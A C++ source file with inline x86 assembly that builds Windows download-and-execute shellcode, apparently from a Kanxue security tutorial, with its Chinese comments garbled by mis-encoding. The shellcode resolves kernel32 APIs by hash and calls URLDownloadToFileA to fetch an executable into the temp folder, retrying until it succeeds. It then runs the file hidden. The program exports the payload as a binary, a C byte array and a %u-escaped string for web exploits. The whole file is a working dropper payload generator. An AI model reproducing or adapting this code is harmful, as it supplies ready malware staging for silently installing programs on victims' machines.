/*-----------------------------------------------------------------------
��14��  ©����������
����������ܣ����İ棩��
(c)  ��ѩѧԺ www.kanxue.com 2000-2018
-----------------------------------------------------------------------*/

// shellcode.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>

int main(int argc, char* argv[])
{
	DWORD scStart,scEnd;
	goto getShellcode;	
	__asm
	{
sc_start:
		//shellcode�������д
		
		/*
		*	shellcode ����ģ��
		*	��һ��������Kernel32��ַ	
		*
		*/
		xor		ecx, ecx
		mov		ecx, dword ptr fs:[30h]
		mov		ecx, dword ptr [ecx+0Ch]
		mov		esi, dword ptr [ecx+1Ch]
sc_goonKernel:  
		mov		eax, dword ptr [esi+8]
        mov		ebx, dword ptr [esi+20h]            
        mov		esi, dword ptr [esi]
        cmp		dword ptr [ebx+0Ch], 320033h;�ж��������ַ�32��unicode
        jnz		sc_goonKernel

		mov		ebx, eax  ;��ȡkernel32��ַ 
		/*
		*	shellcode ����ģ��
		*	�ڶ���������API��ַ	
		*
		*/
		jmp		DataArea
backToMain:
		pop     ebp			//�������ݵ�ַ
		

		//��ȡKernel32��API�ĵ�ַ
		//ebx��ֵdll��ַ
		//edi��ֵhashֵ��ַ
		//ecx��ֵAPI����
		mov     edi, ebp
		mov		ecx, 07h
FindApi_loop:		
		call    FindApi //ѭ������API��ַ
		loop	FindApi_loop

		//����LoadLibraryA����urlmon
		push	6e6fh
		push	6d6c7275h
		mov		eax, esp
		push	eax
		call	dword ptr[ebp] //Kernel32.LoadLibrary
		mov		ebx, eax
		pop     eax
		pop     eax	//ƽ��ջ

		//��ȡurlmon��API�ĵ�ַ		
		call    FindApi


		/*
		*	shellcode ����ģ��
		*	��һ��������·������	
		*
		*/
		//����ռ����ļ�·�� 
		push    40h
		push    1000h
		push    100h			//����ռ��С
		push    0
		call    dword ptr [ebp+04h]	//	kernel32.VirtualAlloc
		mov     dword ptr [ebp+20h], eax
		//��ȡ��ʱ�ļ���·��
		push	eax
		push	100h
		call	dword ptr [ebp+0ch]//Kernel32.GetTempPathA
		//������ʱexe�ļ�·��
		//%TEMP%\test.exe
		mov		ecx, dword ptr[ebp+20h]
		add		ecx, eax
		mov		dword ptr[ecx], 74736574h
		mov		dword ptr[ecx+4], 6578652eh
		mov		dword ptr[ecx+8], 0
		/*
		*	shellcode ����ģ��
		*	�ڶ����������ļ�URLDownloadToFile	
		*
		*/
try_Download:
		push	0
		push	0
		push	dword ptr[ebp+20h]//exe·��
		lea		eax, dword ptr[ebp+24h]//URL
		push	eax
		push	0
		call	dword ptr[ebp+1ch]//urlmon.URLDowanloadToFileA
		test	eax, eax
		jz		Download_OK
		push	30000//����30������
		call	dword ptr[ebp+14h]//Kernel32.Sleep
		jmp		try_Download
		/*
		*	shellcode ����ģ��
		*	�������������ļ�WinExec	
		*
		*/
Download_OK:
		push	SW_HIDE
		push	dword ptr[ebp+20h]
		call	dword ptr[ebp+10h]//Kernel32.WinExec
		
		push    08000h
		push    00h
		push    dword ptr [ebp+20h]
		call    dword ptr [ebp+08h]//kernel32.VirtualFree

		push	0
		push	0FFFFFFFFh
		call	dword ptr[ebp+18h]//Kernel32.TerminateProcess
		/*
		*	shellcode ����ģ��
		*	����API��ַ	
		*
		*/
FindApi:
		push    ecx
		push    ebp
		mov     esi, dword ptr [ebx+3Ch]	// e_lfanew
		mov     esi, dword ptr [esi+ebx+78h]// EATAddr
		add     esi, ebx
		push    esi
		mov     esi, dword ptr [esi+20h]    //AddressOfNames
		add     esi, ebx
		xor     ecx, ecx
		dec     ecx
			
Find_Loop:		
		inc     ecx
		lods    dword ptr [esi]
		add     eax, ebx
		xor     ebp, ebp
		//����hashֵ	
Hash_Loop:
		movsx   edx, byte ptr [eax]
		cmp     dl, dh
		je      hash_OK
		ror     ebp, 7
		add     ebp, edx
		inc     eax
		jmp     Hash_Loop
			
hash_OK:
		//�ж�hashֵ�Ƿ����
		cmp     ebp, dword ptr [edi]		
		jnz     Find_Loop

		pop     esi
		mov     ebp, dword ptr [esi+24h]	//Ordinal Table
		add     ebp, ebx
		mov     cx, word ptr [ebp+ecx*2]
		mov     ebp, dword ptr [esi+1Ch]	//Address Table
		add     ebp, ebx
		mov     eax, dword ptr [ebp+ecx*4]
		add     eax, ebx
		stos    dword ptr es:[edi]
		pop     ebp
		pop     ecx
		retn
DataArea:
		call	backToMain

sc_end:
	}
getShellcode:
	_asm
	{		
		mov		scStart, offset sc_start
		mov		scEnd, offset sc_end
	}
	DWORD scLen = scEnd - scStart;
	char Datas[] = 
		"\x32\x74\x91\x0c"		//ebp,Kernel32.LoadLibraryA
		"\x67\x59\xde\x1e"		//ebp+4,Kernel32.VirtualAlloc
		"\x05\xaa\x44\x61"		//ebp+8,Kernel32.VirtualFree
		"\x39\xe2\x7D\x83"		//ebp+0ch,Kernel32.GetTempPathA
		"\x51\x2f\xa2\x01"		//ebp+10h,Kernel32.WinExec
		"\xa0\x65\x97\xcb"		//ebp+14h,Kernel32.Sleep
		"\x8f\xf2\x18\x61"		//ebp+18h,Kernel32.TerminateProcess 
		"\x80\xd6\xaf\x9a"		//ebp+1ch,Urlmon.URLDownloadToFileA
		"\x00\x00\x00\x00"		//ebp+20h,�����ռ�
		"http://127.0.0.1/calc.exe"//ebp+24h,�������ص�ַ
		"\x00\x00";

	int newscBuff_length = scLen+sizeof(Datas);
	unsigned char *newscBuff = new unsigned char[newscBuff_length];

	memset(newscBuff,0x00,newscBuff_length);
	memcpy(newscBuff,(unsigned char *)scStart,scLen);
	memcpy((unsigned char *)(newscBuff+scLen),Datas,sizeof(Datas));
	int i=0;
	unsigned char xxx;
	for (i = 0;i < newscBuff_length; i++)
	{
		xxx = ((unsigned char *)newscBuff)[i];
		xxx = xxx ^ 0x00;
		newscBuff[i] = xxx;
	}
	
	FILE *fp = fopen("./shellcode_bin.bin","wb+");
	fwrite(newscBuff,newscBuff_length,1,fp);
	fclose(fp);
	
	FILE *fp_cpp = fopen("./shellcode_cpp.cpp","wb+");
	fwrite("unsigned char sc[] = {",22,1,fp_cpp);
	for (i=0;i<newscBuff_length;i++)
	{
		if (i%16==0)
		{
			fwrite("\r\n",2,1,fp_cpp);
		}
		fprintf(fp_cpp,"0x%02x,",newscBuff[i]);
	}
	fwrite("};",2,1,fp_cpp);
	fclose(fp_cpp);
	
	FILE *fp_unicode = fopen("./shellcode_unescape.txt","wb+");
	for(i = 0; i < newscBuff_length; i += 2)
	{
		fprintf(fp_unicode,"%%u%02x%02x",newscBuff[i+1],newscBuff[i]);
	}
	fclose(fp_unicode);
	printf("Hello World!\n");
	return 0;
}

